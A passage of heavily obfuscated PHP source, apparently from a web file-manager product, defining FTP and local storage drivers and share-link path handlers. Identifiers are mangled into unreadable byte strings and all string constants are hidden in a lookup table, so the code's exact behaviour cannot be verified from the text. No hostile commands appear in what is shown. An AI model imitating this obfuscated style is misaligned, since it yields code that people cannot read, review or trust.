$ğ‰™ÕÇƒ = false, $Í‰ª…Æ¸ = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($é€ù©ÁÀ))) { return !1; } $é€ù©ÁÀ = $this->iconvSystem($é€ù©ÁÀ); $›®»‚Ùú = $this->iconvSystem($›®»‚Ùú); $¥ó°çë“ = ftp_nb_put($this->connect, $é€ù©ÁÀ, $›®»‚Ùú, FTP_BINARY); while ($¥ó°çë“ == FTP_MOREDATA) { $¥ó°çë“ = ftp_nb_continue($this->connect); } if ($¥ó°çë“ != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[¿ÈˆÑ¸ä][1594], !0); return !1; } return $this->getPathOuter($é€ù©ÁÀ); } public function download($Ï¾Ï©ßï, $×‹º³€ä = '') { if (!$this->_isconn()) { return !1; } $Ò ™û„Å = $this->pathFather($×‹º³€ä); if (!IO::mkdir($Ò ™û„Å)) { return !1; } $Ï¾Ï©ßï = $this->iconvSystem($Ï¾Ï©ßï); $×‹º³€ä = $this->iconvSystem($×‹º³€ä); $…ÎÇ’ß = ftp_nb_get($this->connect, $×‹º³€ä, $Ï¾Ï©ßï, FTP_BINARY); while ($…ÎÇ’ß == FTP_MOREDATA) { $…ÎÇ’ß = ftp_nb_continue($this->connect); } if ($…ÎÇ’ß != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[¿ÈˆÑ¸ä][1594], !0); return !1; } return $this->iconvApp($×‹º³€ä); } public function exist($÷¥Ú‰Áô) { return $this->isFile($÷¥Ú‰Áô) || $this->isFolder($÷¥Ú‰Áô); } public function isFile($Î‘„îÌÌ) { return !$this->isFolder($Î‘„îÌÌ) && $this->objectMeta($Î‘„îÌÌ); } public function isFolder($Ë–ñæ÷Ä) { return $this->cacheMethod($_SERVER[¿ÈˆÑ¸ä][178], $Ë–ñæ÷Ä); } protected function objectMeta($Ğ´—ÎĞ›) { return $this->cacheMethod($_SERVER[¿ÈˆÑ¸ä][180], $Ğ´—ÎĞ›); } protected function _objectMeta($û÷è±µ) { $’şÙµÊ™ =& $_SERVER[¿ÈˆÑ¸ä]; if ($û÷è±µ == $’şÙµÊ™[12] || $û÷è±µ == $’şÙµÊ™[8]) { return array(); } if (!$this->_isconn()) { return !1; } $û÷è±µ = $this->iconvSystem($û÷è±µ); $£“šæ¶İ = array($’şÙµÊ™[32] => $this->iconvApp($û÷è±µ), $’şÙµÊ™[33] => $’şÙµÊ™[231], $’şÙµÊ™[79] => 0); $ñĞí†¸æ = @ftp_size($this->connect, $û÷è±µ); if ($ñĞí†¸æ != -1) { $£“šæ¶İ[$’şÙµÊ™[79]] = $ñĞí†¸æ; } else { $§äİ‡ø¥ = @ftp_chdir($this->connect, $û÷è±µ); if (!$§äİ‡ø¥) { return !1; } @ftp_chdir($this->connect, $’şÙµÊ™[8]); $£“šæ¶İ[$’şÙµÊ™[33]] = $’şÙµÊ™[78]; } return $£“šæ¶İ; } protected function _isFolder($œÕÙˆô) { $–…ãÊœ¥ =& $_SERVER[¿ÈˆÑ¸ä]; if ($œÕÙˆô == $–…ãÊœ¥[12] || $œÕÙˆô == $–…ãÊœ¥[8]) { return !0; } $Óİ²ƒóù = $this->_objectMeta($œÕÙˆô); return isset($Óİ²ƒóù[$–…ãÊœ¥[33]]) && $Óİ²ƒóù[$–…ãÊœ¥[33]] == $–…ãÊœ¥[78] ? !0 : !1; } } class PathDriverJOS extends PathDriverBaseS3 { public function __construct($öÄÈªÛÁ) { parent::__construct($öÄÈªÛÁ); $this->setSignVersion($_SERVER[¿ÈˆÑ¸ä][248]); } public function uploadLink($²çÓ÷İÑ, $°¶ªÈ† = 0) { $Ûõ©ÌÍí =& $_SERVER[¿ÈˆÑ¸ä]; if ($this->isUploadServer()) { return; } $ãÀàåë = $this->getType(); if (!in_array($ãÀàåë, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $¬ÙÔ„†ï = (!$°¶ªÈ† ? 1 : ceil($°¶ªÈ† / pow(1024, 3))) * 3600 * 4; $¯³¥Æ¬Æ = $this->uploadMultiData($²çÓ÷İÑ, $¬ÙÔ„†ï); if ($¯³¥Æ¬Æ) { $¯³¥Æ¬Æ[$Ûõ©ÌÍí[95]] = $²çÓ÷İÑ; $¯³¥Æ¬Æ[$Ûõ©ÌÍí[96]] = $ãÀàåë; } return $¯³¥Æ¬Æ; } public function fileOutImage($™“È¾„Å, $Ù¬ˆÅœ¦ = 250) { if ($this->size($™“È¾„Å) > 1024 * 1024 * 25) { return $this->fileOutImageServer($™“È¾„Å, $Ù¬ˆÅœ¦); } $‡Û¾Ğ¼¿ = $this->link($™“È¾„Å); $‡Û¾Ğ¼¿ .= $_SERVER[¿ÈˆÑ¸ä][1597] . $Ù¬ˆÅœ¦; $this->fileOutLink($‡Û¾Ğ¼¿); } } class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($ôŞ¸ÜË) { if (substr($ôŞ¸ÜË, 0, 2) == $_SERVER[¿ÈˆÑ¸ä][1459]) { $ôŞ¸ÜË = BASIC_PATH . substr($ôŞ¸ÜË, 2); } return $ôŞ¸ÜË; } public function iconvApp($¢ š©›ï) { $ñ›Óç»í =& $_SERVER[¿ÈˆÑ¸ä]; global $config; return $this->iconvTo($¢ š©›ï, $config[$ñ›Óç»í[1583]], $config[$ñ›Óç»í[1582]]); } public function iconvSystem($§ş’Ñ ƒ) { $§¶ªªÂ‰ =& $_SERVER[¿ÈˆÑ¸ä]; global $config; return $this->iconvTo($§ş’Ñ ƒ, $config[$§¶ªªÂ‰[1582]], $config[$§¶ªªÂ‰[1583]]); } public function getPathOuter($îîá‚Ú) { $Í î°Ù =& $_SERVER[¿ÈˆÑ¸ä]; $‹¼şÏâ = $this->iconvApp($this->pathBase); $îîá‚Ú = $this->iconvApp($îîá‚Ú); if (substr($‹¼şÏâ, 0, 2) == $Í î°Ù[1459]) { $‹¼şÏâ = BASIC_PATH . substr($‹¼şÏâ, 2); } if (substr($îîá‚Ú, 0, 2) == $Í î°Ù[1459]) { $îîá‚Ú = BASIC_PATH . substr($îîá‚Ú, 2); } $‹¼şÏâ = KodIO::clear($‹¼şÏâ); $îîá‚Ú = KodIO::clear($îîá‚Ú); $îîá‚Ú = substr($îîá‚Ú, strlen($‹¼şÏâ)); if (empty($this->pathDriver)) { return $îîá‚Ú; } return $this->pathDriver . $Í î°Ù[8] . ltrim($îîá‚Ú, $Í î°Ù[8]); } public function mkfile($ØÂŞëüí, $Êœ®ºÖ = '', $¹Â›ãš¨ = REPEAT_RENAME) { $ØÂŞëüí = $this->iconvSystem($ØÂŞëüí); @touch($ØÂŞëüí); if ($Êœ®ºÖ) { file_put_contents($ØÂŞëüí, $Êœ®ºÖ); } @chmod($ØÂŞëüí, $this->pathAuth); if (is_file($ØÂŞëüí)) { return $this->getPathOuter($ØÂŞëüí); } $this->writeLog(__FUNCTION__ . $_SERVER[¿ÈˆÑ¸ä][1594], !0); return !1; } public function mkdir($éØô©×, $É£µ¬îÛ = REPEAT_SKIP) { $éØô©× = $this->iconvSystem($éØô©×); if (is_dir($éØô©×)) { return $this->getPathOuter($éØô©×); } @mkdir($éØô©×, $this->pathAuth, !0); @chmod($éØô©×, $this->pathAuth); if (is_dir($éØô©×)) { return $this->getPathOuter($éØô©×); } $this->writeLog(__FUNCTION__ . $_SERVER[¿ÈˆÑ¸ä][1594], !0); return !1; } public function copyFile($°ûáÚµä, $ÙÖİ»ğí) { $this->mkdir($this->pathFather($ÙÖİ»ğí)); $°ûáÚµä = $this->iconvSystem($°ûáÚµä); $ÙÖİ»ğí = $this->iconvSystem($ÙÖİ»ğí); $úÅÜğ±Ú = copy_64($°ûáÚµä, $ÙÖİ»ğí); @chmod($ÙÖİ»ğí, $this->pathAuth); if ($úÅÜğ±Ú) { return $this->getPathOuter($ÙÖİ»ğí); } $this->writeLog(__FUNCTION__ . $_SERVER[¿ÈˆÑ¸ä][1594], !0); return !1; } public function moveFile($¬•¢Úèö, $Ö¨´¢®) { $this->mkdir($this->pathFather($Ö¨´¢®)); $¬•¢Úèö = $this->iconvSystem($¬•¢Úèö); $Ö¨´¢® = $this->iconvSystem($Ö¨´¢®); $Ø€ú¦Õò = intval(@rename($¬•¢Úèö, $Ö¨´¢®)); if (!$Ø€ú¦Õò) { if ($Ø€ú¦Õò = intval(@copy_64($¬•¢Úèö, $Ö¨´¢®))) { @unlink($¬•¢Úèö); } } @chmod($Ö¨´¢®, $this->pathAuth); if ($Ø€ú¦Õò) { return $this->getPathOuter($Ö¨´¢®); } $this->writeLog(__FUNCTION__ . $_SERVER[¿ÈˆÑ¸ä][1594], !0); return !1; } public function movePath($²¼İ¤±Ñ, $öê•ş§, $„Ùˆªî = false) { $´–•ĞÆÙ =& $_SERVER[¿ÈˆÑ¸ä]; $²¼İ¤±Ñ = $this->iconvSystem($²¼İ¤±Ñ); $öê•ş§ = $this->iconvSystem($öê•ş§); $õ³åÜ£ = rtrim($öê•ş§, $´–•ĞÆÙ[8]) . $´–•ĞÆÙ[8] . ($„Ùˆªî ? $„Ùˆªî : get_path_this($²¼İ¤±Ñ)); if (file_exists($õ³åÜ£)) { return !1; } $“Ì¼ÜÂ = intval(@rename($²¼İ¤±Ñ, $õ³åÜ£)); $“Ì¼ÜÂ = file_exists($õ³åÜ£); if ($“Ì¼ÜÂ) { return $this->getPathOuter($õ³åÜ£); } $this->writeLog(__FUNCTION__ . $´–•ĞÆÙ[1594], !0); return !1; } public function delFile($ñãöÕÌÅ) { $ñãöÕÌÅ = $this->iconvSystem($ñãöÕÌÅ); if (!@unlink($ñãöÕÌÅ)) { @chmod($ñãöÕÌÅ, $this->pathAuth); if (@unlink($ñãöÕÌÅ)) { return !0; } $this->writeLog(__FUNCTION__ . $_SERVER[¿ÈˆÑ¸ä][1594], !0); return !1; } return !0; } public function delFolder($—ã¥åøë) { $ƒƒù€— =& $_SERVER[¿ÈˆÑ¸ä]; $—ã¥åøë = $this->iconvSystem($—ã¥åøë); if (!is_dir($—ã¥åøë)) { return !0; } if (!($´€°úÏä = opendir($—ã¥åøë))) { return !1; } while (($õ¹‘ÕË = readdir($´€°úÏä)) !== !1) { if ($õ¹‘ÕË == $ƒƒù€—[10] || $õ¹‘ÕË == $ƒƒù€—[1404]) { continue; } $¬ôÍš = $—ã¥åøë . $ƒƒù€—[8] . $õ¹‘ÕË; if (is_file($¬ôÍš) || is_link($¬ôÍš)) { if (!unlink($¬ôÍš)) { chmod($¬ôÍš, $this->pathAuth); if (!unlink($¬ôÍš)) { return !1; } } } else { if (is_dir($¬ôÍš)) { chmod($¬ôÍš, $this->pathAuth); $¬ôÍš = $this->iconvApp($¬ôÍš); if (!$this->delFolder($¬ôÍš)) { return !1; } } } } closedir($´€°úÏä); return rmdir($—ã¥åøë); } public function rename($Öò¤¨¿Î, $°‰×¡’â) { $öìé‡Ù— =& $_SERVER[¿ÈˆÑ¸ä]; $€ğ «ŸŒ = $this->fileNameAuto($this->pathFather($Öò¤¨¿Î), $°‰×¡’â); $€ğ «ŸŒ = $this->iconvSystem($€ğ «ŸŒ); $Öò¤¨¿Î = $this->iconvSystem($Öò¤¨¿Î); $’„ÓØŒ = $this->pathFather($Öò¤¨¿Î); $–Ş¤ó Î = rtrim($’„ÓØŒ, $öìé‡Ù—[8]) . $öìé‡Ù—[8] . $€ğ «ŸŒ; $Ğ‹Ÿ›Ò‹ = @rename($Öò¤¨¿Î, $–Ş¤ó Î); $–Ş¤ó Î = $this->iconvApp($–Ş¤ó Î); if ($Ğ‹Ÿ›Ò‹) { return $this->getPathOuter($–Ş¤ó Î); } $this->writeLog(__FUNCTION__ . $öìé‡Ù—[1594], !0); return !1; } public function size($–¯–Ë‡ù) { $–¯–Ë‡ù = $this->iconvSystem($–¯–Ë‡ù); return filesize_64($–¯–Ë‡ù); } public function info($ÙÃÏàÚ) { $ÙÃÏàÚ = $this->iconvSystem($ÙÃÏàÚ); if ($this->isFolder($ÙÃÏàÚ)) { return $this->folderInfo($ÙÃÏàÚ); } else { if ($this->isFile($ÙÃÏàÚ)) { return $this->fileInfo($ÙÃÏàÚ); } } return !1; } protected function infoChildren($ºˆöô‚î, &$ÒòıÛíÎ, $‚×Ù’•£ = true) { $’«•–ò =& $_SERVER[¿ÈˆÑ¸ä]; check_abort_echo(); $ºˆöô‚î = rtrim($ºˆöô‚î, $’«•–ò[8]) . $’«•–ò[8]; if ($‚×Ù’•£) { $ºˆöô‚î = $this->iconvSystem($ºˆöô‚î); } if (!($ˆ±óˆË´ = @opendir($ºˆöô‚î))) { return; } while (($‡û¯ÓÖ = readdir($ˆ±óˆË´)) !== !1) { if ($‡û¯ÓÖ == $’«•–ò[10] || $‡û¯ÓÖ == $’«•–ò[1404]) { continue; } $ˆ‘’—ùë = $ºˆöô‚î . $‡û¯ÓÖ; if (is_file($ˆ‘’—ùë) || is_link($ˆ‘’—ùë)) { $ÒòıÛíÎ[$’«•–ò[80]]++; $ÒòıÛíÎ[$’«•–ò[79]] += filesize_64($ˆ‘’—ùë); } else { if (is_dir($ˆ‘’—ùë)) { $ÒòıÛíÎ[$’«•–ò[81]]++; $this->infoChildren($ˆ‘’—ùë, $ÒòıÛíÎ, !1); } } } closedir($ˆ±óˆË´); } private function folderInfo($Öï¾’šø, $æ½Úâ = false) { $Âë”ùæ¨ =& $_SERVER[¿ÈˆÑ¸ä]; $Öï¾’šø = rtrim($Öï¾’šø, $Âë”ùæ¨[8]) . $Âë”ùæ¨[8]; $¥÷Áá¿ñ = $this->iconvApp($this->pathThis($Öï¾’šø)); if ($æ½Úâ) { return array($Âë”ùæ¨[32] => $¥÷Áá¿ñ, $Âë”ùæ¨[87] => $this->getPathOuter($Öï¾’šø), $Âë”ùæ¨[33] => $Âë”ùæ¨[78]); } $©›ñå†ö = array($Âë”ùæ¨[32] => $¥÷Áá¿ñ, $Âë”ùæ¨[87] => $this->getPathOuter($Öï¾’šø), $Âë”ùæ¨[33] => $Âë”ùæ¨[78], $Âë”ùæ¨[232] => @filectime($Öï¾’šø), $Âë”ùæ¨[88] => @filemtime($Öï¾’šø), $Âë”ùæ¨[1598] => @fileatime($Öï¾’šø), $Âë”ùæ¨[1599] => is_readable($Öï¾’šø), $Âë”ùæ¨[1600] => is_writable($Öï¾’šø), $Âë”ùæ¨[1601] => get_mode($Öï¾’šø)); return $©›ñå†ö; } private function fileInfo($€ÓÚÄ—ü, $¢Š £‚¸ = false) { $•Ãİä‡è =& $_SERVER[¿ÈˆÑ¸ä]; $„›•Éü = $this->iconvApp($this->pathThis($€ÓÚÄ—ü)); if ($¢Š £‚¸) { return array($•Ãİä‡è[32] => $„›•Éü, $•Ãİä‡è[87] => $this->getPathOuter($€ÓÚÄ—ü), $•Ãİä‡è[33] => $•Ãİä‡è[231], $•Ãİä‡è[79] => $this->size($€ÓÚÄ—ü), $•Ãİä‡è[167] => $this->ext($„›•Éü)); } $¸Âúœˆ© = array($•Ãİä‡è[32] => $„›•Éü, $•Ãİä‡è[87] => $this->getPathOuter($€ÓÚÄ—ü), $•Ãİä‡è[33] => $•Ãİä‡è[231], $•Ãİä‡è[232] => @filectime($€ÓÚÄ—ü), $•Ãİä‡è[88] => @filemtime($€ÓÚÄ—ü), $•Ãİä‡è[1598] => @fileatime($€ÓÚÄ—ü), $•Ãİä‡è[79] => $this->size($€ÓÚÄ—ü), $•Ãİä‡è[167] => $this->ext($„›•Éü), $•Ãİä‡è[1599] => is_readable($€ÓÚÄ—ü), $•Ãİä‡è[1600] => is_writable($€ÓÚÄ—ü), $•Ãİä‡è[1601] => get_mode($€ÓÚÄ—ü)); return $¸Âúœˆ©; } public function exist($áªô˜Ó×) { $áªô˜Ó× = $this->iconvSystem($áªô˜Ó×); return @file_exists($áªô˜Ó×); } public function isFile($·¬óğÃ) { $·¬óğÃ = $this->iconvSystem($·¬óğÃ); return @is_file($·¬óğÃ); } public function isFolder($ĞµîÃĞá) { $ĞµîÃĞá = $this->iconvSystem($ĞµîÃĞá); return @is_dir($ĞµîÃĞá); } public function listPath($¥½ıØÑˆ, $éüí’à» = false) { $ºæûƒ¦ =& $_SERVER[¿ÈˆÑ¸ä]; $¥½ıØÑˆ = $this->iconvSystem($¥½ıØÑˆ); $¥½ıØÑˆ = rtrim($¥½ıØÑˆ, $ºæûƒ¦[8]) . $ºæûƒ¦[8]; $òàº‘°À = array($ºæûƒ¦[85] => array(), $ºæûƒ¦[86] => array()); if (!($–ùÖ×Ğ´ = @opendir($¥½ıØÑˆ))) { return $òàº‘°À; } while (($èã¡î«ù = readdir($–ùÖ×Ğ´)) !== !1) { if ($èã¡î«ù == $ºæûƒ¦[10] || $èã¡î«ù == $ºæûƒ¦[1404]) { continue; } $³Ö§ëˆ  = $¥½ıØÑˆ . $èã¡î«ù; if (is_file($³Ö§ëˆ )) { $òàº‘°À[$ºæûƒ¦[86]][] = $this->fileInfo($³Ö§ëˆ , $éüí’à»); } else { $òàº‘°À[$ºæûƒ¦[85]][] = $this->folderInfo($³Ö§ëˆ , $éüí’à»); } } closedir($–ùÖ×Ğ´); return $òàº‘°À; } public function listAll($ˆÏ‡˜, &$¨À”½ = array()) { $¥É¶úÈ½ =& $_SERVER[¿ÈˆÑ¸ä]; $ˆÏ‡˜ = $this->iconvSystem($ˆÏ‡˜); $ˆÏ‡˜ = rtrim($ˆÏ‡˜, $¥É¶úÈ½[8]) . $¥É¶úÈ½[8]; if (!($ö”Ó†Š = @opendir($ˆÏ‡˜))) { return $¨À”½; } while (($ó¬¶³Şæ = readdir($ö”Ó†Š)) !== !1) { if ($ó¬¶³Şæ == $¥É¶úÈ½[10] || $ó¬¶³Şæ == $¥É¶úÈ½[1404]) { continue; } $ÌŠ«Ö«ª = $ˆÏ‡˜ . $ó¬¶³Şæ; $Šú–Ô¶º = is_dir($ÌŠ«Ö«ª) && !is_link($ÌŠ«Ö«ª) ? 1 : 0; $ÌŠ«Ö«ª = $Šú–Ô¶º ? $ÌŠ«Ö«ª . $¥É¶úÈ½[8] : $ÌŠ«Ö«ª; $¨À”½[] = array($¥É¶úÈ½[87] => $this->getPathOuter($ÌŠ«Ö«ª), $¥É¶úÈ½[78] => $Šú–Ô¶º, $¥É¶úÈ½[88] => intval(@filemtime($ÌŠ«Ö«ª)), $¥É¶úÈ½[79] => $Šú–Ô¶º ? 0 : intval($this->size($ÌŠ«Ö«ª))); if ($Šú–Ô¶º) { $this->listAll($ÌŠ«Ö«ª, $¨À”½); } } closedir($ö”Ó†Š); return $¨À”½; } public function has($¨Ì‘À“ˆ, $§¾øü”å = false, $ÃŸ¼©ò = true) { $„„äÓ²ä =& $_SERVER[¿ÈˆÑ¸ä]; $¨Ì‘À“ˆ = $this->iconvSystem($¨Ì‘À“ˆ); $¨Ì‘À“ˆ = rtrim($¨Ì‘À“ˆ, $„„äÓ²ä[8]) . $„„äÓ²ä[8]; if (!($Ş¹ÜÚ¦İ = @opendir($¨Ì‘À“ˆ))) { return !1; } $ÒşŒ€é» = 0; $ÔŸ¹Ùéª = 0; $Ú×š¿ÆŸ = 0; while (($å¢†±ÌÒ = readdir($Ş¹ÜÚ¦İ)) !== !1) { if ($å¢†±ÌÒ == $„„äÓ²ä[10] || $å¢†±ÌÒ == $„„äÓ²ä[1404]) { continue; } $öôƒ×©Ò = $¨Ì‘À“ˆ . $å¢†±ÌÒ; if ($§¾øü”å) { $Ú×š¿ÆŸ++; if (@is_file($öôƒ×©Ò)) { $ÒşŒ€é»++; } else { $ÔŸ¹Ùéª++; } if ($Ú×š¿ÆŸ > 10000) { break; } continue; } if ($ÃŸ¼©ò) { if (@is_file($öôƒ×©Ò)) { return !0; } } else { if (@is_dir($öôƒ×©Ò . $„„äÓ²ä[8])) { return !0; } } } closedir($Ş¹ÜÚ¦İ); if ($§¾øü”å) { return array($„„äÓ²ä[240] => $ÒşŒ€é», $„„äÓ²ä[241] => $ÔŸ¹Ùéª); } return !1; } public function hashSimple($£ÇÖí²) { $ç‚ç¤àÅ =& $_SERVER[¿ÈˆÑ¸ä]; if (!$£ÇÖí²) { return md5($ç‚ç¤àÅ[12]); } $£ÇÖí² = $this->iconvSystem($£ÇÖí²); $éÈä‡˜ã = $this->size($£ÇÖí²); $×ÙÀıÅã = 200; $éŞ¹ğÛ§ = 50; if ($éÈä‡˜ã <= $×ÙÀıÅã * $éŞ¹ğÛ§) { return $this->hashMd5($£ÇÖí²) . $éÈä‡˜ã; } $´ÙÛ‡¾É = $ç‚ç¤àÅ[12]; $¼‹ßñ¿Û = intval($éÈä‡˜ã / $éŞ¹ğÛ§); $ÈÉÛûü¯ = fopen($£ÇÖí², $ç‚ç¤àÅ[1602]); if (!$ÈÉÛûü¯) { return $´ÙÛ‡¾É; } for ($Õèõä“é = 0; $Õèõä“é < $éŞ¹ğÛ§; $Õèõä“é++) { fseek_64($ÈÉÛûü¯, $¼‹ßñ¿Û * $Õèõä“é); $´ÙÛ‡¾É .= fread($ÈÉÛûü¯, $×ÙÀıÅã); } fseek_64($ÈÉÛûü¯, $éÈä‡˜ã - $×ÙÀıÅã); $´ÙÛ‡¾É .= fread($ÈÉÛûü¯, $×ÙÀıÅã); fclose($ÈÉÛûü¯); return md5($´ÙÛ‡¾É) . $éÈä‡˜ã; } public function getContent($ø¤« ³·) { $ø¤« ³· = $this->iconvSystem($ø¤« ³·); return file_get_contents($ø¤« ³·); } public function setContent($¨ÚÛÉÇ, $£°øêÄ = '') { $¨ÚÛÉÇ = $this->iconvSystem($¨ÚÛÉÇ); $§¤ı  = @file_put_contents($¨ÚÛÉÇ, $£°øêÄ, LOCK_EX); if (!$§¤ı ) { $this->writeLog(__FUNCTION__ . $_SERVER[¿ÈˆÑ¸ä][1594], !0); } clearstatcache(); @chmod($¨ÚÛÉÇ, $this->pathAuth); return $§¤ı  === !1 ? !1 : !0; } public function fileSubstr($—ŞÎŠô, $²®åšéü = 0, $ß˜³œşÕ = false) { $¨¨¶Ë =& $_SERVER[¿ÈˆÑ¸ä]; $—ŞÎŠô = $this->iconvSystem($—ŞÎŠô); if ($ß˜³œşÕ === !1) { $ß˜³œşÕ = $this->size($—ŞÎŠô); } if ($ß˜³œşÕ <= 0) { return $¨¨¶Ë[12]; } $ŒÃÇ¢ïÇ = fopen($—ŞÎŠô, $¨¨¶Ë[1602]); if (!$ŒÃÇ¢ïÇ) { return !1; } fseek_64($ŒÃÇ¢ïÇ, $²®åšéü); $—«û¦û = fread($ŒÃÇ¢ïÇ, $ß˜³œşÕ); fclose($ŒÃÇ¢ïÇ); if (!$—«û¦û) { $this->writeLog(__FUNCTION__ . $¨¨¶Ë[1594], !0); } return $—«û¦û; } public function upload($÷Şè®õ­, $éÍĞ÷–˜, $³®ûÈÆÀ = false, $üİæ–ãÏ = REPEAT_REPLACE) { if ($³®ûÈÆÀ) { return $this->moveFile($éÍĞ÷–˜, $÷Şè®õ­); } return $this->copyFile($éÍĞ÷–˜, $÷Şè®õ­); } public function setModifyTime($ÉÊôº§©, $Â¬Â²¦Å = '') { @touch($ÉÊôº§©, intval($Â¬Â²¦Å)); } public function download($™İ­Û‚¬, $Á”ÍøÔ½) { return $this->iconvSystem($™İ­Û‚¬); } } goto C½‹İğ–¾Â; B‡¤³İˆ§Ÿ: class PathDriverDbShareLink extends PathDriverDB { public function __construct($ÔµŠâ¨) { $this->pathParse = $ÔµŠâ¨; $this->model = Model($_SERVER[¿ÈˆÑ¸ä][1469]); } protected function infoParse($‰èÒ’®º, $Ãó ½¦ = false, $ŒƒåòÛª = false) { $ĞˆªÃŸ¯ =& $_SERVER[¿ÈˆÑ¸ä]; return Action($ĞˆªÃŸ¯[1296])->sharePathInfo($this->pathParse[$ĞˆªÃŸ¯[87]], !0, $Ãó ½¦); } public function listPath($‹öéµ¦ê, $œŠ÷­¥³ = false) { $†Ç¬Š =& $_SERVER[¿ÈˆÑ¸ä]; $Úğãª„ğ = parent::listPath($‹öéµ¦ê, $œŠ÷­¥³); if (!$Úğãª„ğ) { return $Úğãª„ğ; } if (is_array($Úğãª„ğ[$†Ç¬Š[1477]])) { $Úğãª„ğ[$†Ç¬Š[1477]] = Action($†Ç¬Š[1296])->shareItemInfo($Úğãª„ğ[$†Ç¬Š[1477]]); } foreach ($Úğãª„ğ as $¸…¢úµı => $İ²î›ø÷) { if (!in_array($¸…¢úµı, array($†Ç¬Š[86], $†Ç¬Š[85]))) { continue; } foreach ($İ²î›ø÷ as $Á®îµÕ“ => $ùÒ‚´×Â) { $Úğãª„ğ[$¸…¢úµı][$Á®îµÕ“] = Action($†Ç¬Š[1296])->shareItemInfo($ùÒ‚´×Â); } } return $Úğãª„ğ; } public function listAll($Ô¾½ºŒµ) { $¢ÕòŞâü =& $_SERVER[¿ÈˆÑ¸ä]; $â©¥Â™ = IO::info($this->pathParse[$¢ÕòŞâü[87]]); if (!$â©¥Â™) { return array(); } $ÔŸßÌìè = $this->model->listAll($Ô¾½ºŒµ); foreach ($ÔŸßÌìè as &$ƒØ”“²») { $ƒØ”“²»[$¢ÕòŞâü[90]] = Action($¢ÕòŞâü[1296])->shareItemInfo($ƒØ”“²»[$¢ÕòŞâü[90]]); } unset($ƒØ”“²»); return $ÔŸßÌìè; } } class PathDriverDriverShareItem { public function __construct($Î·–š•) { $this->pathParse = $Î·–š•; } public function __call($ˆÍñìÎ, $æàÉ¯â) { $œ°ÎÎ† =& $_SERVER[¿ÈˆÑ¸ä]; if (method_exists($this, $ˆÍñìÎ)) { return; } $ßÁ§°öä = call_user_func_array(array($œ°ÎÎ†[1478], $ˆÍñìÎ), $æàÉ¯â); $í’ªúä² = array($œ°ÎÎ†[1479], $œ°ÎÎ†[1480], $œ°ÎÎ†[1481], $œ°ÎÎ†[1482], $œ°ÎÎ†[637], $œ°ÎÎ†[639], $œ°ÎÎ†[1483], $œ°ÎÎ†[108], $œ°ÎÎ†[1484], $œ°ÎÎ†[1485]); if (in_array($ˆÍñìÎ, $í’ªúä²)) { $ßÁ§°öä = $this->getPathOuter($ßÁ§°öä); } return $ßÁ§°öä; } public function copy($¶Õ˜ëıœ, $€ŞÃşÏù, $òœµ¡’ì = false, $ î‰÷” = false) { return $this->copyMove($¶Õ˜ëıœ, $€ŞÃşÏù, $òœµ¡’ì, $_SERVER[¿ÈˆÑ¸ä][637], $ î‰÷”); } public function move($‡Ê¢‡‹Î, $¥±ßÀ®£, $šÌİ¡šú = false, $òéÂæÊÑ = false) { return $this->copyMove($‡Ê¢‡‹Î, $¥±ßÀ®£, $šÌİ¡šú, $_SERVER[¿ÈˆÑ¸ä][639], $òéÂæÊÑ); } private function copyMove($á‰–¼ñ«, $Ä«Â¨Ø, $œò©öÂ, $ÆÓèıö§, $“Şü«Î = false) { $¾”¬‡ãù =& $_SERVER[¿ÈˆÑ¸ä]; $ß›ÀÑĞ = $Ä«Â¨Ø; $İÊóÉ‡Ô = IO::driverMake($Ä«Â¨Ø); if ($İÊóÉ‡Ô->pathParse[$¾”¬‡ãù[1270]]) { $Ä«Â¨Ø = $İÊóÉ‡Ô->pathParse[$¾”¬‡ãù[1270]]; } else { $Ä«Â¨Ø = $ß›ÀÑĞ; } $«È€»„ = IO::copyMove($á‰–¼ñ«, $Ä«Â¨Ø, $œò©öÂ, $ÆÓèıö§, $“Şü«Î); $«È€»„ = $this->getPathOuter($«È€»„); return $«È€»„; } public function pathThis($ÏÆÆ”É) { return get_path_this($this->pathParse[$_SERVER[¿ÈˆÑ¸ä][87]]); } public function pathFather($‘Ò¢î´) { return get_path_father($this->pathParse[$_SERVER[¿ÈˆÑ¸ä][87]]); } public function iconvSystem($Ô­†°¾´) { return $Ô­†°¾´; } protected function infoParse($ŒÑê¸¼›, $…Ü“…•ª = false) { $ƒÃ€îêä =& $_SERVER[¿ÈˆÑ¸ä]; $â—ØÚÂ = $this->pathParse[$ƒÃ€îêä[572]][$ƒÃ€îêä[579]] . $this->pathParse[$ƒÃ€îêä[1289]]; if ($…Ü“…•ª) { $Û´î±ş³ = IO::infoWithChildren($â—ØÚÂ); } else { $Û´î±ş³ = IO::info($â—ØÚÂ); } $ß¸ŒÛÃ’ = $this->pathParse[$ƒÃ€îêä[572]]; return Action($ƒÃ€îêä[1476])->_shareItemeParse($Û´î±ş³, $ß¸ŒÛÃ’); } public function listAll($±³Ò¸) { $„Êì»²ƒ =& $_SERVER[¿ÈˆÑ¸ä]; $÷÷•Ş™é = IO::listAll($±³Ò¸); $óÙüº = rtrim($this->pathParse[$„Êì»²ƒ[572]][$„Êì»²ƒ[579]], $„Êì»²ƒ[8]); foreach ($÷÷•Ş™é as &$…ášˆ‰Œ) { $…ášˆ‰Œ[$„Êì»²ƒ[87]] = $this->pathDriver . $„Êì»²ƒ[8] . ltrim(substr($…ášˆ‰Œ[$„Êì»²ƒ[87]], strlen($óÙüº)), $„Êì»²ƒ[8]); } unset($…ášˆ‰Œ); return $÷÷•Ş™é; } public function listAllSimple($¬ší®´£, $Ü‡¾Ë½ = false) { $Ş×±‡âù =& $_SERVER[¿ÈˆÑ¸ä]; $•ÖœéÄ = $this->listAll($¬ší®´£); $„¬­è…† = $this->pathParse[$Ş×±‡âù[506]]; if (trim($„¬­è…†, $Ş×±‡âù[8]) == trim(get_path_father($„¬­è…†), $Ş×±‡âù[8])) { $Ü‡¾Ë½ = !0; } return IO::init($Ş×±‡âù[12])->listAllSimpleMake($•ÖœéÄ, $„¬­è…†, $Ü‡¾Ë½); } public function getPathOuter($úÙÁëé³) { $€¥ùµøÒ =& $_SERVER[¿ÈˆÑ¸ä]; $ÊÏŠË¬ø = KodIO::parse($úÙÁëé³); if 